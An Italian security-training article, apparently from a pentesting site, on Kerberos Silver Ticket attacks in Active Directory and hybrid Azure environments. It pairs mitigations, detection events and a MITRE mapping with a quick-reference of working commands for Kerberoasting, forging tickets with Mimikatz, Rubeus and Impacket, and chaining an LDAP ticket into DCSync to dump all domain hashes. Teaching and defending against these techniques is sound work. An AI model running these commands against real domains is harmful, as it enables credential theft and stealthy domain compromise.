**Cosa funziona e cosa no in ambienti ibridi:**

| Risorsa                    | Silver Ticket funziona? | Perché                                                  |
| -------------------------- | ----------------------- | ------------------------------------------------------- |
| File server on-prem        | ✅ Sì                    | CIFS Kerberos on-prem                                   |
| SQL Server on-prem         | ✅ Sì                    | MSSQLSvc Kerberos on-prem                               |
| Exchange on-prem           | ✅ Sì                    | HTTP Kerberos on-prem                                   |
| SharePoint Online          | ❌ No                    | OAuth2/Azure AD                                         |
| Exchange Online (M365)     | ❌ No                    | OAuth2/Azure AD                                         |
| Azure VM (Azure-joined)    | ❌ No                    | Azure AD auth, non Kerberos on-prem                     |
| VM on-prem (domain-joined) | ✅ Sì                    | Kerberos on-prem                                        |
| Azure AD Connect server    | ⚠️ Sì, ma attenzione    | È on-prem — compromettere Azure AD Connect è devastante |

**Azure AD Connect — il punto critico degli ambienti ibridi**

Se l'ambiente usa Azure AD Connect per la sincronizzazione on-prem → cloud, compromettere quel server (o l'account `MSOL_XXXXXXXXXX` che usa) apre vettori verso Azure AD. Un Silver Ticket per CIFS o LDAP sul server Azure AD Connect può essere il ponte tra on-prem e cloud.

> Il Silver Ticket non raggiunge il cloud direttamente — ma può colpire l'infrastruttura ibrida che connette on-prem al cloud. Per attacchi specifici ad Azure AD in ambienti ibridi, vedi [Active Directory — exploitation](https://hackita.it/articoli/active-directory/).

***

## Mitigazione e prevenzione

* **Password lunghe e randomiche per service account (30+ caratteri)**: Rende il Kerberoasting inefficace. Con 30 caratteri random il crack è computazionalmente impossibile.
* **gMSA (Group Managed Service Accounts)**: Account gestiti da AD con password auto-rotata ogni 30 giorni, generata randomicamente da AD stesso. Praticamente immune al Kerberoasting e al Silver Ticket — ma non è una difesa assoluta.

> **Limite dei gMSA:** Se l'attaccante riesce a fare DCSync o a compromettere uno degli host autorizzati al recupero della password gMSA (`PrincipalsAllowedToRetrieveManagedPassword`), ottiene l'hash corrente e può comunque forgiare un Silver Ticket valido fino alla prossima rotazione (max 30 giorni). Il gMSA riduce drasticamente la finestra di esposizione ma non la azzera.

```powershell
# Crea un gMSA
New-ADServiceAccount -Name "gMSA_SQL" -DNSHostName SQL01.corp.local \
  -PrincipalsAllowedToRetrieveManagedPassword "SQL01$"

# Assegna al server
Install-ADServiceAccount -Identity gMSA_SQL
```

* **Abilita PAC Validation** sui servizi critici: Forza il servizio a contattare il DC per validare il PAC → Silver Ticket rilevato/bloccato. Da abilitare via GPO o registry su server specifici.

```
HKLM\SYSTEM\CurrentControlSet\Control\Lsa
ValidateKdcPacSignature = 1
```

* **Rotazione regolare delle password dei computer account**: Default Windows è 30 giorni — non disabilitarlo.
* **Monitora [DCSync](https://hackita.it/articoli/dcsync/)**: Event ID 4662 per accessi con diritti di replica. Se vedi DCSync da un account non-DA, indaga immediatamente.
* **LAPS** (Local Administrator Solution Password): Password admin locale unica e rotante per ogni macchina — limita il dump locale di LSASS come vettore per ottenere l'hash del computer account.
* **Protected Users Security Group**: Forza Kerberos (no NTLM), impedisce la delega, richiede AES. Aggiungici tutti gli account privilegiati.
* **Limita i SPN non necessari**: Rimuovi SPN orfani o inutilizzati — meno superficie di attacco per [Kerberoasting](https://hackita.it/articoli/kerberoasting/) e Silver Ticket. Usa [BloodHound](https://hackita.it/articoli/bloodhound/) per mappare tutti gli SPN del dominio e identificare quelli ad alto rischio.
* **Forza AES come encryption type** (`msDS-SupportedEncryptionTypes`): valore `0` (default legacy) = RC4 + tutto accettato. Imposta `24` (AES128+AES256) o `16` (solo AES256) per bloccare i ticket RC4.
* **Kerberos Armoring (FAST)**: Disponibile da Windows Server 2012, cifra le comunicazioni AS-REQ/TGS-REQ tra client e KDC. Sul Silver Ticket ha impatto limitato — il ticket viene forgiato offline senza toccare il KDC — ma riduce la superficie di attacco su altri vettori Kerberos (AS-REP Roasting, downgrade). Vale abilitarlo nei Domini Funzionali ≥ 2012 tramite GPO `KDC support for claims, compound authentication and Kerberos armoring`.

***

## Confronto: Silver / Golden / Diamond / Sapphire

|                     | [Silver Ticket](https://hackita.it/articoli/silver-ticket/) | [Golden Ticket](https://hackita.it/articoli/golden-ticket/) | [Diamond Ticket](https://hackita.it/articoli/diamond-ticket/) | [Sapphire Ticket](https://hackita.it/articoli/sapphire-ticket/) |
| ------------------- | ----------------------------------------------------------- | ----------------------------------------------------------- | ------------------------------------------------------------- | --------------------------------------------------------------- |
| Hash richiesto      | Service account                                             | krbtgt                                                      | krbtgt + TGT reale                                            | krbtgt + PAC reale                                              |
| Scope               | Singolo servizio/host                                       | Intero dominio                                              | Intero dominio                                                | Intero dominio                                                  |
| Richiede DA?        | No                                                          | Sì                                                          | Sì                                                            | Sì                                                              |
| Contatta DC?        | No                                                          | No                                                          | Sì (TGT reale)                                                | Sì (PAC reale)                                                  |
| AS-REQ nei log      | No                                                          | No                                                          | Sì                                                            | Sì                                                              |
| PAC coerente con AD | No (forgiato)                                               | No (forgiato)                                               | Parzialmente                                                  | Sì (autentico)                                                  |
| Evento sul DC       | Nessuno                                                     | Nessuno                                                     | 4768/4769                                                     | 4768/4769                                                       |
| Evento sul target   | 4624 Type 3                                                 | 4624 Type 3                                                 | 4624 Type 3                                                   | 4624 Type 3                                                     |
| Remediation         | Reset service account                                       | Doppio reset krbtgt                                         | Doppio reset krbtgt                                           | Doppio reset krbtgt                                             |
| Stealth             | Massima                                                     | Alta                                                        | Molto alta                                                    | Altissima                                                       |
| Impatto             | Singolo servizio                                            | Totale                                                      | Totale                                                        | Totale                                                          |
| Quando usarlo       | Accesso mirato senza DA                                     | Persistenza totale                                          | MDI attivo, evita anomalia AS-REQ                             | Detection avanzata, PAC autentico                               |

***

## Quick Reference

**1. Ottieni l'hash del service account (Kerberoasting):**

```bash
impacket-GetUserSPNs corp.local/user:pass -dc-ip DC_IP -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

**2. Forging con Mimikatz (AES256 + durata realistica):**

```powershell
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX /target:SERVER.corp.local /service:cifs /aes256:AES_KEY /startoffset:0 /endin:600 /renewmax:10080 /ticket:silver.kirbi
kerberos::ptt silver.kirbi
```

**3. Forging con Rubeus:**

```powershell
Rubeus.exe silver /service:cifs/SERVER.corp.local /aes256:AES_KEY /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX /nowrap /ptt
```

**4. Forging con Impacket da Linux:**

```bash
python3 ticketer.py -aesKey AES_KEY -domain-sid S-1-5-21-XXXXXXXXXX -domain corp.local -spn cifs/SERVER.corp.local -duration 600 Administrator
export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass corp.local/Administrator@SERVER.corp.local
```

**5. Silver Ticket LDAP → DCSync (senza DA):**

```bash
python3 ticketer.py -nthash HASH_DC01 -domain-sid SID -domain corp.local -spn ldap/DC01.corp.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass -just-dc-ntlm corp.local/Administrator@DC01.corp.local
```

**6. Remediation — reset service account:**

```powershell
Set-ADAccountPassword -Identity svc_target -Reset -NewPassword (ConvertTo-SecureString "NuovaPwd!" -AsPlainText -Force)
# Per computer account:
Reset-ComputerMachinePassword -Server DC01.corp.local
```

***

## FAQ

**Il Silver Ticket funziona anche se l'utente impersonato ha cambiato password?**
Sì. Il ticket è cifrato con l'hash del service account, non con quello dell'utente impersonato. La password dell'utente impersonato è irrilevante.

**Cosa invalida un Silver Ticket?**
Solo il reset della password del service account (o del computer account) usato per forgiarlo. Non il reset di krbtgt, non il cambio di password dell'utente impersonato.

**Il Silver Ticket funziona su sistemi aggiornati?**
Dipende dalla configurazione. Se PAC validation è abilitata e l'username non esiste in AD (post-patch Nov 2021), il ticket viene rifiutato. Su configurazioni di default standard funziona ancora.

**Silver Ticket vs Kerberoasting: qual è la differenza?**
Kerberoasting cracka l'hash del service account offline per ottenere la password in chiaro. Il Silver Ticket usa direttamente l'hash (senza craccare) per forgiare ticket — più rapido ma richiede l'hash raw, non la password.

**Posso usare un Silver Ticket per spostarmi su altri host?**
No. Il Silver Ticket vale solo per il servizio sull'host specificato nell'SPN. Per spostarti su altri host devi forgiare ticket separati o usare il Golden Ticket.

**Con l'hash di DC01$ posso fare DCSync?**
Sì — è uno dei path più sottovalutati. Silver Ticket per `ldap/DC01.corp.local` con l'hash di `DC01$` → DCSync → tutti gli hash del dominio.

**PAC validation rompe tutti i Silver Ticket?**
Non tutti. Se il servizio gira come SYSTEM (invece di un account utente), esegue la server signature verification internamente senza contattare il DC. PAC validation tramite NRPC si attiva principalmente per servizi che girano come account utente o servizio specifico.

***

## Mappazione MITRE ATT\&CK

| Tattica           | Tecnica                                                         | Descrizione                                  |
| ----------------- | --------------------------------------------------------------- | -------------------------------------------- |
| Credential Access | **[T1558.002](https://attack.mitre.org/techniques/T1558/002/)** | Silver Ticket (Forge Kerberos Tickets)       |
| Credential Access | **[T1558.003](https://attack.mitre.org/techniques/T1558/003/)** | Kerberoasting (per ottenere l'hash)          |
| Credential Access | **[T1003.001](https://attack.mitre.org/techniques/T1003/001/)** | LSASS dump (alternativa per ottenere l'hash) |
| Lateral Movement  | **[T1550.003](https://attack.mitre.org/techniques/T1550/003/)** | Pass the Ticket                              |
| Lateral Movement  | **[T1021.002](https://attack.mitre.org/techniques/T1021/002/)** | SMB/Windows Admin Shares (via CIFS)          |
| Lateral Movement  | **[T1021.006](https://attack.mitre.org/techniques/T1021/006/)** | WinRM (via WSMAN)                            |

***

## Takeaway finale

1. **Il Silver Ticket è il più stealth di tutti i Kerberos attack** — nessun evento sul DC, nessun TGS-REQ, solo un logon di rete sul target.
2. **L'hash di DC01$ + Silver Ticket LDAP = DCSync senza DA** — path di escalation critico e spesso ignorato dalla difesa.
3. **La remediation è chirurgica**: basta resettare la password del service account compromesso, non toccare krbtgt.
4. **gMSA è la difesa più efficace** — password auto-rotante, immune a Kerberoasting e Silver Ticket.

***

## Conclusione

Il Silver Ticket è lo strumento di precisione nell'arsenale Kerberos: scope limitato, impatto chirurgico, stealth massima. Non richiede Domain Admin, non tocca il KDC, non lascia tracce sul DC. Il difensore che cerca solo eventi sul Domain Controller non lo vedrà mai. La detection richiede correlazione a livello di host target e abilitazione della PAC validation — configurazioni rare negli ambienti enterprise.

Il path più critico: hash di `DC01$` → Silver Ticket LDAP → DCSync → Golden Ticket. Tutto questo partendo da un account di backup con privilegi limitati, senza mai essere formalmente Domain Admin.

***

## Articoli correlati

* [Kerberos — autenticazione in Active Directory](https://hackita.it/articoli/kerberos/)
* [Golden Ticket](https://hackita.it/articoli/golden-ticket/)
* [Diamond Ticket](https://hackita.it/articoli/diamond-ticket/)
* [Sapphire Ticket](https://hackita.it/articoli/sapphire-ticket/)
* [Kerberoasting](https://hackita.it/articoli/kerberoasting/)
* [DCSync](https://hackita.it/articoli/dcsync/)
* [Pass-the-Ticket](https://hackita.it/articoli/pass-the-ticket/)
* [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash/)
* [Mimikatz](https://hackita.it/articoli/mimikatz/)
* [Rubeus](https://hackita.it/articoli/rubeus/)
* [Impacket](https://hackita.it/articoli/impacket/)
* [NetExec](https://hackita.it/articoli/netexec/)
* [Active Directory — exploitation](https://hackita.it/articoli/active-directory/)
* [Porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/)

***

## Fonti e riferimenti esterni

* [MITRE ATT\&CK – T1558.002: Silver Ticket](https://attack.mitre.org/techniques/T1558/002/)
* [MITRE ATT\&CK – T1558.003: Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
* [MITRE ATT\&CK – T1550.003: Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
* [Impacket – ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
* [ADSecurity – Detecting Forged Kerberos Tickets](https://adsecurity.org?p=1515)

> Uso esclusivo in ambienti autorizzati.

\#silver-ticket #kerberos #active-directory #windows #lateral-movement
